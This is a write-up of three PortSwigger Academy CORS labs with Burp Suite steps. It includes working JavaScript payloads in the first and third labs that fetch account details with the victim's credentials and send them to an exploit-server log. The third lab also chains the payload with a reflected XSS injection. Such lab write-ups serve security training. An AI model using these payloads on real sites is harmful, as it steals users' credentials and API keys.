#### Reference: [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

###### Analysis: 
we need to see if attacker website can access the content of victim website.
For that we need to look for `Access-Control-Allow-Origin` in response header.

**checking for Access-Control-Allow-Origin** 
when you find `Access-Control-Allow-Credentials` Inside request message. 

You can perform Following Steps to confirm Allow Origin.
1. Send the `Origin: https://example.com` header and anaylsis reponse.

##### Stpes:

1. Login in your account.

2. Go to burp HTTP history and look for /accountDetails request.

3. Inside /accountDetails reponse you will find `Access-Control-Allow-Credentials` send the request to repeter.

4. Add `Origin: https://example.com` and send request to website and check for `Access-Control-Allow-Origin` Inside response message.

5. Now go to exploit section  and Past the script.
```
`<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true; 
req.send(); 
function reqListener() { 
	location='/log?key='+this.responseText; 
};
</script>`
```

6. You will get access of administrator api inside log section.

7. Submit the API.

There you go !!!

---
#### Reference: [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)


##### Analysis:
we need to see if attacker website can access the content of victim website.
For that we need to look for `Access-Control-Allow-Origin` in response header.

**checking for Access-Control-Allow-Origin** 
when you find `Access-Control-Allow-Credentials` Inside request message. 

You can perform Following Steps to confirm Allow Origin.
1. Send the `Origin: https://example.com` header and analyze reponse.
2. Add `Origin: null` and analyze response.

##### Steps: 
1. Login in your account.

2. Go to burup HTTP history and look for /accountDetails request.

3.  Inside /accountDetails reponse you will find `Access-Control-Allow-Credentials` send the request to repeter.

4. Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.`

5. Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.

6. Go to exploit server and past the script.

7. Go to log anaylsis.

8. There you will find administrator API.

9. Submit inside the lab.

There you go !!!

---

#### Reference: [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

##### Analysis:

You can perform Following Steps to confirm Allow Origin.
1. Send the `Origin: https://example.com` header and analyze reponse.
2. Add `Origin: null` and analyze response.
3. change origin header which start with origin of the site as subdomain.
	Example: site:example.com then add origin header as example.net.malicious.com 
4. Change the origin header which end with the origin of the site.
	Example -> site:example.net so origin: malicious.example.net

Now if there is any xss vulnerability in subdomain it can then script can be execute from that subdomain and it will give api.

##### Steps:
1. Log in your account.

2. In burp go to /accountDetails request.

3. You will see response of /accountDetails you will get `Access-Control-Allow-Credentials:true`.

4. Send it to Repeater and add origin as `origin: https://random.labid.websecurity-acadmey.net`.

5. you will get response contaning `Access-Control-Allow-Origin`.

6. Now you need to find an xss vulnerability.

7. explore the website and monitor the burpsuite https history you will get xss in check stock page.

8. Send `/?productId=1&storeId=1` to repeater and add xss script.

9. `/?productId=1<script>alert(1)</script>&storeId=1` You will get error in response but script will be executed.

10. Now construct the payload to send.
```
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

11. Go to log section.

12. Submit the API.

There you go !!!

---
---

					Completed All Labs !!!

